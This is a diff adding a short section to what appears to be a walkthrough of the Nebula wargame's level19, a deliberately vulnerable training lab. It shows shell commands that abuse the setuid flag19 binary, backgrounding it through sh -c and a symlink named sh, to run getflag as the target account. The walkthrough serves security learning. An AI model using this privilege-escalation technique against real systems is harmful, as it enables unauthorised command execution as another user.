@@ -58,3 +58,13 @@ I found that executing `sh -c 'COMMAND &'` will cause the wanted effect.
 level19@nebula:/home/flag19$ sh -c './flag19 -c "echo hello world"&'
 level19@nebula:/home/flag19$ hello world
 ```
+
+### Running as flag19
+Seems to happen because `bash` does not execute shell scripts as setuid.
+```console
+level19@nebula:~$ ln -s -T /home/flag19/flag19 sh
+```
+```console
+level19@nebula:~$ /bin/sh -c "./sh -c \"getflag\" &"
+level19@nebula:~$ You have successfully executed getflag on a target account
+```
